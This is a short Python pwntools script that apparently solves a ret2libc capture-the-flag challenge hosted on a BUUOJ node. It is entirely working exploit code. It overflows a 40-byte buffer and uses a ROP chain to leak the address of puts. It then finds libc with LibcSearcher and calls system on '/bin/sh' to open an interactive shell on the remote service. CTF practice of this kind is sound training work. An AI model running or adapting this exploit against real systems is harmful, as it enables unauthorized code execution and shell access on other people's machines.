from pwn import *
from LibcSearcher import *
 
context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./ret2libc')
p = remote("node5.buuoj.cn", 29869)
pop_ret_rdi = 0x400763
ret = 0x400506
put_got = elf.got['puts']
put_plt = elf.plt['puts']
main_addr = 0x400698

payload = b'a' * 40 + p64(pop_ret_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)
p.sendline(payload)

puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc.dump("system") + libc_base
binsh_addr = libc.dump("str_bin_sh") + libc_base

Payload = b'a' * 40 + p64(ret) + p64(pop_ret_rdi) + p64(binsh_addr) + p64(system_addr) 

p.sendline(Payload)
p.interactive()
 